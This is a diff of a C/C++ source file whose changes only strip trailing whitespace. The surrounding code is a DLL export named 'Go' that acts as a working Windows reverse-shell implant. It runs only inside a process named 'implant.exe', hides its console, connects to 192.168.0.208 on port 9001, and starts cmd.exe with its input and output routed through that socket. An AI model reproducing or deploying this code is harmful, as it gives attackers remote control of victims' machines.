@@ -7,9 +7,9 @@
 
 WSADATA wsaData;
 SOCKET Winsock;
-struct sockaddr_in hax; 
-char ip_addr[16] = "192.168.0.208"; 
-char port[6] = "9001";            
+struct sockaddr_in hax;
+char ip_addr[16] = "192.168.0.208";
+char port[6] = "9001";
 
 
 STARTUPINFO ini_processo;
@@ -17,7 +17,7 @@ STARTUPINFO ini_processo;
 PROCESS_INFORMATION processo_info;
 
 extern "C" __declspec(dllexport) void Go(void) {
-	
+
 	int rv = 0;
 	LPSTR out = NULL;
 	char lpFileName[200];
@@ -25,16 +25,16 @@ extern "C" __declspec(dllexport) void Go(void) {
 
 	out = PathFindFileNameA((LPCSTR)lpFileName);
 	rv = strcmp(out, "implant.exe");
-	
+
 	if(rv == 0){
 		FreeConsole();
 		unsigned char cmd[255] = {'c','m','d','.','e','x','e',0x0};
-	
+
 		WSAStartup(MAKEWORD(2, 2), &wsaData);
 		Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-		
 
-		struct hostent *host; 
+
+		struct hostent *host;
 		host = gethostbyname(ip_addr);
 		strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
 
@@ -46,13 +46,13 @@ extern "C" __declspec(dllexport) void Go(void) {
 
 		memset(&ini_processo, 0, sizeof(ini_processo));
 		ini_processo.cb = sizeof(ini_processo);
-		ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+		ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
 
-		CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);	
-		
+		CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
 	}
-	
+
 
 
 }
